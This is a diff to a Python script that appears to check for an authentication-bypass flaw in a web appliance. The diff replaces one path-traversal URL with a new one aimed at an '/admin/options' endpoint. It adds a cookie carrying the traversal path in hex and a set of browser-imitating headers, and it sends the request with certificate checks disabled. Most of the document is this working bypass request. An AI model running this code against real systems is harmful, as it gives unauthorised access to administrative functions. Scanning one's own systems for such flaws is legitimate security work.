@@ -10,7 +10,7 @@ import urllib3
 try:
     from colorama import Fore, Style, init
 
-    init()  # Initialize colorama
+    init()
     COLOR_ENABLED = True
 except ImportError:
     COLOR_ENABLED = False
@@ -44,8 +44,26 @@ def check_system_info(host, protocol, port, user_agent):
 
 
 def check_bypass_vulnerability(host, protocol, port, user_agent):
-    bypass_url = f"{protocol}://{host}:{port}/api/v1/totp/user-backup-code/../../system/system-information"
-    headers = {"User-Agent": user_agent}
+    bypass_url = (
+        f"{protocol}://{host}:{port}/api/v1/cav/client/status/../../admin/options"
+    )
+    headers = {
+        "User-Agent": user_agent,
+        "Cookie": "DSLaunchURL=2F6170692F766C2F6361762F636C69656E742F7374617475732F2E2E2F2E2E2F61646D696E2F6F7074696F6E73; DSSignInURL=/",
+        "Cache-Control": "max-age=0",
+        "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"macOS"',
+        "Upgrade-Insecure-Requests": "1",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "close",
+    }
 
     try:
         res = requests.get(bypass_url, headers=headers, verify=False, timeout=5)
@@ -63,7 +81,7 @@ def check_bypass_vulnerability(host, protocol, port, user_agent):
         else:
             return f"HTTP Error: {res.status_code}"
     except requests.exceptions.RequestException as e:
-        return f"Network Issue"
+        return f"Network Issue: {e}"
         # More Verbose: return f"Network Issue: {e}"
 
 
